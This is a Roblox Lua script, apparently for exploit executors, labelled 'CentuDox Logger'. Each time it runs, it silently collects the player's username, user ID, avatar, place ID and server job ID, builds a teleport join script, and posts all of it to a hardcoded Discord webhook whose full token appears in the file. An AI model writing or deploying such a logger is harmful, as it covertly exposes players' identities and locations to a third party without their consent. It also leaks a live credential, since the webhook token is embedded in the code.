local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- Webhook
local webhook = "https://discord.com/api/webhooks/1494331688245792798/j47YmsarYjs6u2GYE6P-aAovmvyoMMVypH7j_YkZq8u-68sbaaGeeOR3zyed_6bR8q2C"

-- Player info
local username = LocalPlayer.Name
local userId = LocalPlayer.UserId

-- Game info
local jobId = game.JobId
local placeId = game.PlaceId

-- FIXED headshot (direct render)
local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"

-- Join script
local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..placeId..', "'..jobId..'", game.Players.LocalPlayer)'

-- Request function
local request = (syn and syn.request) or (http and http.request) or http_request or request

-- Embed
local data = {
    ["embeds"] = {{
        ["title"] = "Execution Detected 🎉",
        ["description"] = username .. " has executed CentuDox 🎉",
        ["color"] = 65280,
        ["thumbnail"] = {
            ["url"] = headshot
        },
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = username,
                ["inline"] = true
            },
            {
                ["name"] = "User ID",
                ["value"] = tostring(userId),
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId ~= "" and jobId or "N/A",
                ["inline"] = false
            },
            {
                ["name"] = "Join Script",
                ["value"] = "```lua\n"..joinScript.."\n```",
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "CentuDox Logger"
        }
    }}
}

-- Send
request({
    Url = webhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(data)
})
